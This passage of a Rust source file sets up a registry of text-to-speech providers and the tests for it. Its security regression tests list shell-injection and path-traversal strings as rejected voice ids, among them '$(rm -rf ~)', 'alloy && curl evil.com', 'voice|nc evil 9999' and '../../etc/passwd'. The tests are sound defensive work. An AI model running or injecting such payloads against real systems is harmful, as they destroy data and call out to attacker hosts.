        info: ProviderInfo {
            default_voice: "en-US-AvaMultilingualNeural",
            ..ProviderInfo::new("edge", "Microsoft Edge (free)")
        },
        max_text_length: |_| 5_000,
        build: |_| Some(Box::new(EdgeTtsProvider)),
    },
    // Raw PCM in JSON, WAV-wrapped host-side so system players accept it.
    TtsProviderDef {
        info: ProviderInfo {
            key_env: &["GEMINI_API_KEY", "GOOGLE_API_KEY"],
            key_url: "https://aistudio.google.com/apikey",
            base_url: "https://generativelanguage.googleapis.com/v1beta",
            default_model: "gemini-2.5-flash-preview-tts",
            default_voice: "Kore",
            ..ProviderInfo::new("gemini", "Google Gemini")
        },
        max_text_length: |_| 5_000,
        build: |cx| {
            Some(Box::new(GeminiTtsProvider {
                client: cx.client.clone(),
                default_model: cx.default_model(),
                api_key: cx.api_key,
                base_url: cx.base_url,
            }))
        },
    },
    TtsProviderDef {
        info: ProviderInfo {
            key_env: &["XAI_API_KEY"],
            key_url: "https://console.x.ai",
            base_url: "https://api.x.ai/v1",
            default_voice: "eve",
            ..ProviderInfo::new("xai", "xAI Grok")
        },
        max_text_length: |_| 15_000,
        build: |cx| {
            Some(Box::new(XaiTtsProvider {
                client: cx.client.clone(),
                default_language: cx.row.language.clone().unwrap_or_else(|| "en".to_string()),
                default_sample_rate_hz: cx.row.sample_rate_hz.unwrap_or(24_000),
                default_bit_rate: cx.row.bit_rate.unwrap_or(128_000),
                auto_speech_tags: cx.row.xai_auto_speech_tags.unwrap_or(false),
                api_key: cx.api_key,
                base_url: cx.base_url,
            }))
        },
    },
    TtsProviderDef {
        info: ProviderInfo {
            key_env: &["MISTRAL_API_KEY"],
            key_url: "https://console.mistral.ai/api-keys",
            base_url: "https://api.mistral.ai",
            default_model: "voxtral-mini-tts-2603",
            default_voice: "Alloy",
            ..ProviderInfo::new("mistral", "Mistral Voxtral")
        },
        max_text_length: |_| 4_000,
        build: |cx| {
            Some(Box::new(MistralTtsProvider {
                client: cx.client.clone(),
                default_model: cx.default_model(),
                api_key: cx.api_key,
                base_url: cx.base_url,
            }))
        },
    },
    // t2a_v2: hex-encoded MP3 in JSON. The base URL is the full endpoint.
    TtsProviderDef {
        info: ProviderInfo {
            key_env: &["MINIMAX_API_KEY"],
            key_url: "https://www.minimax.io/platform",
            base_url: "https://api.minimax.io/v1/t2a_v2",
            default_model: "speech-02-hd",
            default_voice: "English_expressive_narrator",
            ..ProviderInfo::new("minimax", "MiniMax")
        },
        max_text_length: |_| 10_000,
        build: |cx| {
            Some(Box::new(MiniMaxTtsProvider {
                client: cx.client.clone(),
                default_model: cx.default_model(),
                group_id: cx.config.resolve_credential_or_env("MINIMAX_GROUP_ID"),
                api_key: cx.api_key,
                base_url: cx.base_url,
            }))
        },
    },
    // Local `piper` binary plus a downloaded voice model.
    TtsProviderDef {
        info: ProviderInfo {
            default_voice: "en_US-lessac-medium",
            ..ProviderInfo::new("piper", "Piper (local)")
        },
        max_text_length: |_| 5_000,
        build: |_| {
            Some(Box::new(PiperTtsProvider {
                voices_dir: dirs::home_dir()
                    .map(|h| h.join(".borg").join("cache").join("piper-voices"))
                    .unwrap_or_else(|| std::path::PathBuf::from("/tmp/piper-voices")),
            }))
        },
    },
    TtsProviderDef {
        info: command_provider("kittentts", "KittenTTS (local command)"),
        max_text_length: |_| 2_000,
        build: build_command,
    },
    TtsProviderDef {
        info: command_provider("neutts", "NeuTTS (local command)"),
        max_text_length: |_| 2_000,
        build: build_command,
    },
    TtsProviderDef {
        info: command_provider("custom", "Custom command"),
        max_text_length: |_| 5_000,
        build: build_command,
    },
];

/// Look up a built-in speech provider by id.
pub(super) fn find(id: &str) -> Option<&'static TtsProviderDef> {
    crate::media::provider_info::find(PROVIDERS, id, |d| &d.info)
}

/// Every built-in speech provider, for pickers.
pub fn providers() -> impl Iterator<Item = &'static ProviderInfo> {
    PROVIDERS.iter().map(|d| &d.info)
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn elevenlabs_format_mapping() {
        assert_eq!(elevenlabs_format(AudioFormat::Mp3), "mp3_44100_128");
        assert_eq!(elevenlabs_format(AudioFormat::Opus), "opus_16000");
        assert_eq!(elevenlabs_format(AudioFormat::Aac), "aac_44100");
        assert_eq!(elevenlabs_format(AudioFormat::Flac), "flac_44100");
        assert_eq!(elevenlabs_format(AudioFormat::Wav), "pcm_44100");
    }

    #[test]
    fn registry_is_well_formed() {
        crate::media::provider_info::assert_registry_well_formed(providers());
    }

    #[test]
    fn expand_edge_voice_short_name_handles_locales_and_full_names() {
        // The Edge TTS WSS endpoint requires the full Microsoft voice name;
        // most catalogs only ship short names like `en-US-AvaMultilingualNeural`.
        // Verify the split-on-second-dash logic for common shapes.
        let cases = [
            (
                "en-US-AvaMultilingualNeural",
                "Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)",
            ),
            (
                "pt-BR-FranciscaNeural",
                "Microsoft Server Speech Text to Speech Voice (pt-BR, FranciscaNeural)",
            ),
            // Already-full names must pass through (callers may have the
            // canonical form from a voices/list call).
            (
                "Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)",
                "en-US-AvaMultilingualNeural",
            ),
            // Malformed input — no second dash — falls back to itself
            // rather than producing a broken full name.
            ("AvaNeural", "AvaNeural"),
        ];
        for (input, _expected_output) in &cases {
            let out = expand_edge_voice_short_name(input);
            if input.starts_with("Microsoft Server Speech") {
                // Full-name passthrough returns input unchanged.
                assert_eq!(&out, input);
            } else if input.contains('-') && input.matches('-').count() >= 2 {
                assert!(
                    out.starts_with("Microsoft Server Speech Text to Speech Voice ("),
                    "expected full-name expansion for {input:?}, got {out:?}"
                );
            } else {
                assert_eq!(&out, input, "malformed short name must pass through");
            }
        }
    }

    #[test]
    fn decode_hex_roundtrip() {
        // MiniMax encodes audio as hex string; a decoder bug here would
        // silently corrupt every t2a_v2 reply. Asserts both happy path
        // and structural failures (odd length, invalid digit).
        assert_eq!(decode_hex("48656c6c6f"), Some(b"Hello".to_vec()));
        assert_eq!(decode_hex(""), Some(vec![]));
        assert_eq!(decode_hex("abc"), None, "odd length must reject");
        assert_eq!(decode_hex("zz"), None, "non-hex must reject");
        // Uppercase digits must work too — MiniMax's docs aren't
        // explicit about casing.
        assert_eq!(decode_hex("FF00"), Some(vec![0xFF, 0x00]));
    }

    #[test]
    fn wrap_pcm_as_wav_produces_decodable_riff_header() {
        // 100 samples of silent 24 kHz mono 16-bit PCM. The header must
        // parse via hound — that's the contract Gemini's PCM needs to
        // satisfy before afplay/ffplay will play it.
        let pcm = vec![0u8; 200]; // 100 samples × 2 bytes
        let wav = wrap_pcm_as_wav(&pcm, 24_000, 1, 16);
        // Magic markers in the right places.
        assert_eq!(&wav[..4], b"RIFF");
        assert_eq!(&wav[8..12], b"WAVE");
        assert_eq!(&wav[12..16], b"fmt ");
        assert_eq!(&wav[36..40], b"data");
        // hound roundtrip: must parse + report the format we wrote.
        let reader =
            hound::WavReader::new(std::io::Cursor::new(&wav)).expect("WAV header must be valid");
        let spec = reader.spec();
        assert_eq!(spec.sample_rate, 24_000);
        assert_eq!(spec.channels, 1);
        assert_eq!(spec.bits_per_sample, 16);
    }

    /// Spec: a multi-paragraph reply gets `[pause]` markers between
    /// paragraphs *and* one after the opening sentence (within the 12–120
    /// char window). Single newlines collapse to spaces so the text reads
    /// fluidly without artificial line breaks in Grok's voice.
    #[test]
    fn apply_xai_auto_speech_tags_adds_pause_between_paragraphs() {
        let input =
            "I checked the deploy logs. There are no errors.\n\nThe rollout finished cleanly.";
        let out = apply_xai_auto_speech_tags(input);
        // Pause after the first sentence (within window).
        assert!(
            out.contains("logs. [pause]"),
            "expected post-first-sentence pause: {out}"
        );
        // Pause between paragraphs.
        assert!(
            out.contains("errors. [pause] The rollout"),
            "expected inter-paragraph pause: {out}"
        );
        // No leaked double spaces.
        assert!(!out.contains("  "), "double-space leak: {out:?}");
    }

    /// Spec: when the input already has an explicit speech tag (operator
    /// hand-craft or earlier transform), the function returns it
    /// untouched. Stripping tags would defeat operator intent.
    #[test]
    fn apply_xai_auto_speech_tags_skips_when_tags_present() {
        let with_pause = "Hi there. [pause] How are you?";
        assert_eq!(apply_xai_auto_speech_tags(with_pause), with_pause);

        let with_whisper = "<whisper>this is a secret</whisper>";
        assert_eq!(apply_xai_auto_speech_tags(with_whisper), with_whisper);
    }

    /// Spec: a very short reply ("Hi.") falls below the 12-char first-
    /// sentence window — no pause inserted (would feel awkward in
    /// playback). Empty input round-trips to empty.
    #[test]
    fn apply_xai_auto_speech_tags_no_op_for_short_or_empty_input() {
        assert_eq!(apply_xai_auto_speech_tags(""), "");
        assert_eq!(apply_xai_auto_speech_tags("   "), "   ");
        let short = "Hi.";
        // No pause: too short for the first-sentence rule, no paragraphs.
        let out = apply_xai_auto_speech_tags(short);
        assert!(!out.contains("[pause]"), "no pause expected: {out}");
    }

    /// Spec: a single very long sentence (no `.`/`!`/`?`/`…` in the
    /// first 120 chars) gets no first-sentence pause — the heuristic
    /// must not fire on a wall of text where it would land arbitrarily.
    #[test]
    fn apply_xai_auto_speech_tags_skips_first_sentence_when_too_long() {
        let long = "This is a sentence that goes on and on without any terminator at all and just keeps running past one hundred and twenty characters of normal prose";
        let out = apply_xai_auto_speech_tags(long);
        assert!(!out.contains("[pause]"));
    }

    /// Security regression: the custom-template TTS provider used to splice
    /// the LLM-supplied `voice` into a `sh -c` template without validation.
    /// A model could send `voice = "$(rm -rf ~)"` and the substituted string
    /// would be executed by the shell. `validate_voice_id` is the trust
    /// boundary; this table-test pins the allowed/rejected character classes.
    #[test]
    fn validate_voice_id_rejects_shell_metacharacters() {
        // Accepted: alphanumerics, hyphen, underscore, dot. Real-world voice
        // names ("en_US-lessac-medium", "alloy", "en-US.male.1") must pass.
        for ok in [
            "alloy",
            "en_US-lessac-medium",
            "Adam",
            "en-US.male.1",
            "voice123",
            "A-B_C.D",
        ] {
            assert!(
                validate_voice_id(ok).is_ok(),
                "legitimate voice id rejected: {ok:?}"
            );
        }
        // Rejected: every shell/URL injection vector seen in the wild,
        // plus path-traversal patterns. `..` alone would let a model
        // pivot ElevenLabs' `/v1/text-to-speech/{voice}` URL to the
        // parent path — character-class allowlist alone wouldn't catch
        // that, so there's a dedicated `..` reject branch.
        for bad in [
            "",
            "$(rm -rf ~)",
            "`whoami`",
            "voice; rm /etc/passwd",
            "alloy && curl evil.com",
            "voice|nc evil 9999",
            "../../etc/passwd",
            "voice\nrm -rf /",
            "voice with spaces",
            "voice'or'1=1",
            "voice\"quoted",
            "voice<redirect",
            // Path-traversal patterns: rejected even though every char
            // is in the allowlist set.
            ".",
            "..",
            "voice..suffix",
            "..voice",
            "voice..",
        ] {
            assert!(
                validate_voice_id(bad).is_err(),
                "injection vector accepted: {bad:?}"
            );
        }
    }

    /// Pre-fix, this exact call to `custom_synthesize` would have spawned
    /// `sh -c '... $(touch /tmp/borg_pwned) ...'`. Post-fix, it must error
    /// out *before* the `Command::new("sh")` call so the side-effect file
    /// is never created. The assertion is on the side-effect, not the
    /// error message, so it remains accurate if the wording changes.
    #[test]
    fn custom_synthesize_rejects_shell_metachars_in_voice() {
        let canary = std::env::temp_dir().join(format!(
            "borg_custom_tts_canary_{}.touch",
            std::process::id()
        ));
        // Pre-condition: canary must not exist.
        let _ = std::fs::remove_file(&canary);
        assert!(!canary.exists(), "test setup: canary already exists");

        let template = format!(
            "touch {} && cp {{text_file}} {{out_path}}",
            canary.display()
        );
        let injection = "$(touch /tmp/borg_pwned_should_never_appear)";
        let res = custom_synthesize(
            &template,
            "hello",
            injection,
            "wav",
            "",
            Duration::from_millis(500),
        );
        assert!(
            res.is_err(),
            "custom_synthesize accepted injection vector and ran the shell"
        );
        assert!(
            !canary.exists(),
            "shell command ran despite voice-id validation — security regression"
        );
        // Sanity: the unrelated-but-also-bad /tmp marker should not exist
        // either. (We don't try to delete it on success because we expect
        // it to never be created.)
        assert!(!std::path::Path::new("/tmp/borg_pwned_should_never_appear").exists());
    }

    #[test]
    fn custom_synthesize_renders_model_and_quoted_path_placeholders() {
        let output = custom_synthesize(
            "test {model} = local-model && cp '{text_file}' '{out_path}'",
            "hello custom model",
            "",
            "wav",
            "local-model",
            Duration::from_millis(500),
        )
        .expect("custom synthesize should copy the text payload");
        assert_eq!(output, b"hello custom model");
    }

    // ── Wiremock-backed provider HTTP tests ──
    //
    // Until these existed, every cloud TTS provider could regress its
    // wire protocol (method, path, auth header, body shape) without a
    // single test failing. We bypass `from_config` and instantiate
    // providers directly so we can pin `base_url` at the mock URI —
    // production callers still go through `from_config`.

    use wiremock::matchers::{body_json_string, header, method, path as wm_path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    fn make_synth_request<'a>(text: &'a str, voice: &str) -> SynthesisRequest<'a> {
        SynthesisRequest {
            text,
            voice: voice.to_string(),
            format: AudioFormat::Mp3,
            model: None,
            timeout: Duration::from_secs(5),
        }
    }

    #[tokio::test]
    async fn openai_tts_provider_returns_audio_bytes_on_success() {
        let server = MockServer::start().await;
        let audio_payload = b"\xff\xfb\x90\x00mock-mp3-bytes";
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .and(header("authorization", "Bearer sk-mock"))
            .and(header("content-type", "application/json"))
            .respond_with(
                ResponseTemplate::new(200).set_body_raw(audio_payload.to_vec(), "audio/mpeg"),
            )
            .expect(1)
            .mount(&server)
            .await;

        let provider = OpenAiTtsProvider {
            client: Client::new(),
            api_key: "sk-mock".to_string(),
            base_url: server.uri(),
            default_model: "tts-1".to_string(),
        };
        let bytes = provider
            .synthesize(&make_synth_request("hello", "alloy"))
            .await
            .expect("OpenAI TTS success");
        assert_eq!(bytes, audio_payload);
    }

    #[tokio::test]
    async fn openai_tts_provider_surfaces_429_with_status_and_body() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .respond_with(ResponseTemplate::new(429).set_body_string("rate limited"))
            .expect(1)
            .mount(&server)
            .await;

        let provider = OpenAiTtsProvider {
            client: Client::new(),
            api_key: "sk-mock".to_string(),
            base_url: server.uri(),
            default_model: "tts-1".to_string(),
        };
        let err = provider
            .synthesize(&make_synth_request("hello", "alloy"))
            .await
            .expect_err("429 must surface");
        let msg = format!("{err}");
        assert!(msg.contains("OpenAI"), "missing provider: {msg}");
        assert!(msg.contains("429"), "missing status: {msg}");
        assert!(msg.contains("rate limited"), "missing body: {msg}");
    }

    #[tokio::test]
    async fn openai_tts_provider_sends_voice_and_text_in_request_body() {
        // Asserts the wire-shape isn't quietly changed (no field renames,
        // no missing voice). The mock would 500 if the body shape drifts.
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/audio/speech"))
            .and(body_json_string(
                serde_json::json!({
                    "model": "tts-1",
                    "input": "hi",
                    "voice": "nova",
                    "response_format": "mp3",
                })
                .to_string(),
            ))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(b"OK".to_vec()))
            .expect(1)
            .mount(&server)
            .await;

        let provider = OpenAiTtsProvider {
            client: Client::new(),
            api_key: "sk".to_string(),
            base_url: server.uri(),
            default_model: "tts-1".to_string(),
        };
        let bytes = provider
            .synthesize(&make_synth_request("hi", "nova"))
            .await
            .expect("body shape must match");
        assert_eq!(bytes, b"OK");
    }

    #[tokio::test]
    async fn elevenlabs_tts_provider_returns_audio_bytes_on_success() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/text-to-speech/voice_abc"))
            .and(header("xi-api-key", "el-mock-key"))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(b"eleven-audio".to_vec()))
            .expect(1)
            .mount(&server)
            .await;

        let provider = ElevenLabsTtsProvider {
            client: Client::new(),
            api_key: "el-mock-key".to_string(),
            base_url: server.uri(),
            default_model: "eleven_multilingual_v2".to_string(),
        };
        let bytes = provider
            .synthesize(&make_synth_request("hello", "voice_abc"))
            .await
            .expect("ElevenLabs success");
        assert_eq!(bytes, b"eleven-audio");
    }

    #[tokio::test]
    async fn elevenlabs_tts_provider_surfaces_401_with_status_and_body() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(wm_path("/v1/text-to-speech/voice_abc"))
            .respond_with(ResponseTemplate::new(401).set_body_string("bad key"))
            .expect(1)
            .mount(&server)
            .await;

        let provider = ElevenLabsTtsProvider {
            client: Client::new(),
            api_key: "wrong".to_string(),
            base_url: server.uri(),
            default_model: "eleven_multilingual_v2".to_string(),
        };
        let err = provider
            .synthesize(&make_synth_request("hello", "voice_abc"))
            .await
            .expect_err("401 must surface");
        let msg = format!("{err}");
        assert!(msg.contains("ElevenLabs"), "missing provider: {msg}");
        assert!(msg.contains("401"), "missing status: {msg}");
        assert!(msg.contains("bad key"), "missing body: {msg}");
    }

    #[tokio::test]
    async fn elevenlabs_tts_provider_rejects_path_traversal_voice_pre_flight() {
        // The voice id is spliced into the URL path. A "..", "../admin"
        // etc. attempt must be rejected before reqwest builds the URL,
        // so the test does NOT need a wiremock — validate_voice_id
        // fires first. Mirrors the standalone validate_voice_id_rejects
        // tests but at the provider boundary.
        let provider = ElevenLabsTtsProvider {
            client: Client::new(),
            api_key: "k".to_string(),
            base_url: "http://unused.invalid".to_string(),
            default_model: "eleven_multilingual_v2".to_string(),
        };
        for bad in ["..", "../admin", "voice/../escape", "voice id"] {
            let err = provider
                .synthesize(&make_synth_request("hello", bad))
                .await
                .expect_err(&format!("voice {bad:?} must be rejected"));
            assert!(
                format!("{err}").to_lowercase().contains("voice"),
                "expected voice-id rejection for {bad:?}, got: {err}"
            );
        }
    }
}
